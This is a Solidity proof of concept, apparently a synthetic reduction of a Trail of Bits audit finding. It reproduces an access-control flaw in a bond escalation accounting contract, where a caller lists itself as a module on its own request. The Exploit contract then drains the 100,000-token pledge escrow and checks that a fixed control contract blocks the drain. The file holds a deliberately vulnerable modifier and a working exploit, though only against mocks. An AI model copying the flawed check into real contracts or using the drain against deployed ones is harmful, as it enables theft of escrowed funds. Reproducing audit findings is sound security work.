// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*  Wonderland Prophet BondEscalationAccounting.onlyAllowedModule
    (Trail of Bits, finding 41794).
    SYNTHETIC, cheatcode-free reduction.
    Root cause: allowedModule is true for any address the caller listed on a
    request they created themselves. releasePledge then sends the dispute's
    pledge escrow to that caller. A request that does not list the caller
    reverts, and a fixed module that ignores the request id keeps the funds.
    The modifier is preserved (@> VULN). */

contract MockERC20 {
    string public symbol = "USDC";
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

contract Oracle {
    mapping(bytes32 => mapping(address => bool)) public isModule;

    function createRequest(bytes32 requestId, address module) external {
        isModule[requestId][module] = true;
    }

    function allowedModule(bytes32 requestId, address module) external view returns (bool) {
        return isModule[requestId][module];
    }
}

error AccountingExtension_UnauthorizedModule();

contract BondEscalationAccounting {
    Oracle public oracle;
    MockERC20 public token;
    uint256 public pledged;
    bool public immutable openRequests;
    uint256 public constant PLEDGED = 100_000 ether;

    constructor(Oracle oracle_, MockERC20 token_, bool openRequests_) {
        oracle = oracle_;
        token = token_;
        openRequests = openRequests_;
        pledged = PLEDGED;
    }

    modifier onlyAllowedModule(bytes32 _requestId) {
        if (openRequests) {
            // @> VULN: any self-created request lists the caller as an allowed module
            if (!oracle.allowedModule(_requestId, msg.sender)) revert AccountingExtension_UnauthorizedModule();
        } else {
            if (msg.sender != address(0xBEEF)) revert AccountingExtension_UnauthorizedModule();
        }
        _;
    }

    function releasePledge(bytes32 _requestId, address to, uint256 amount) external onlyAllowedModule(_requestId) {
        pledged -= amount;
        token.transfer(to, amount);
    }
}

contract Exploit {
    bytes32 public constant DISPUTE = keccak256("dispute");
    bytes32 public constant OTHER = keccak256("other");

    MockERC20 public token; // nonce 1
    Oracle public oracle; // nonce 2
    BondEscalationAccounting public accounting; // nonce 3
    BondEscalationAccounting public control; // nonce 4

    uint256 public stolen;
    bool public foreignBlocked;
    bool public fixedBlocked;

    constructor() {
        token = new MockERC20();
        oracle = new Oracle();
        accounting = new BondEscalationAccounting(oracle, token, true);
        control = new BondEscalationAccounting(oracle, token, false);
        token.mint(address(accounting), 100_000 ether);
        token.mint(address(control), 100_000 ether);
        oracle.createRequest(OTHER, address(0xBEEF));
    }

    function run() external {
        oracle.createRequest(DISPUTE, address(this));
        require(oracle.allowedModule(DISPUTE, address(this)), "not listed");
        accounting.releasePledge(DISPUTE, address(this), 100_000 ether);
        stolen = token.balanceOf(address(this));
        require(stolen == 100_000 ether, "pledges were not taken");
        require(accounting.pledged() == 0, "pledge accounting remains");

        try accounting.releasePledge(OTHER, address(this), 1) {
            revert("foreign request paid");
        } catch {
            foreignBlocked = true;
        }
        require(foreignBlocked, "unlisted request was not blocked");

        try control.releasePledge(DISPUTE, address(this), 1) {
            revert("fixed module paid");
        } catch {
            fixedBlocked = true;
        }
        require(fixedBlocked, "fixed accounting paid out");
        require(token.balanceOf(address(control)) == 100_000 ether, "fixed escrow moved");
    }
}
